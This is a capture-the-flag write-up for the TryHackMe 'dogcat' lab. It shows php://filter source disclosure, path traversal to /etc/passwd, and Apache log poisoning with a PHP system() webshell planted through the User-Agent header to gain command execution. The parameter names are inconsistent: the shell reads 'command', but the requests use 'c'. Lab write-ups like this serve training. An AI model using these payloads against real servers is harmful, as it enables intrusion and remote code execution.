Writeup for [dogcat](https://tryhackme.com/r/room/dogcat)

### Recon
```
1. Inspect the code
<a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
2. Notice ?view=dog and ?view=cat, can using php wrapper
```
Using wrapper payloads from [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter)
`?view=php://filter/convert.base64-encode/resource={resource}`

And after a while, we got a hint at
`?view=php://filter/convert.base64-encode/resource=dog`
give as `PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K` which is base64 encoded
`<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />` which is directory somewhere on the system.

Next try
`?view=php://filter/convert.base64-encode/resource=dog/../index` and we got a code of index
```php
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
```

Now we can see that code has vulnerabilities: 
`if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat'))` with ($_GET['view']) alow us using LFI or Path Traversal attacks vectors. If input is not properly sanitized or validated. An attacker could potentially execute arbitrary PHP code by manipulating the view parameter.
So if our user input contain «dog» or «cat», and ext is None we can see local files
`/?view=cat/../../../../../../etc/passwd&ext=` > we got access
`view-source:http://10.10.94.191/?view=cat/../../../../../../var/log/apache2/access.log&ext=` give us a new vector to RCE 

### First flag
```
view-source:http://10.10.71.22/?view=cat/../../../../../../var/log/apache2/access.log&ext&c=ls
view-source:http://10.10.71.22/?view=cat/../../../../../../var/log/apache2/access.log&ext&c=cat%20flag.php
```

### LFI to RCE
via log file with UserAgent HTTP header
```
curl "http://10.10.71.22/" -H "User-Agent: <?php system(\$_GET['command']); ?>"
Give us at log <b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/log/apache2/access.log</b> on line <b>9</b><br />
Expoit ?view=cat/../../../../../../var/log/apache2/access.log&ext&c=id
```


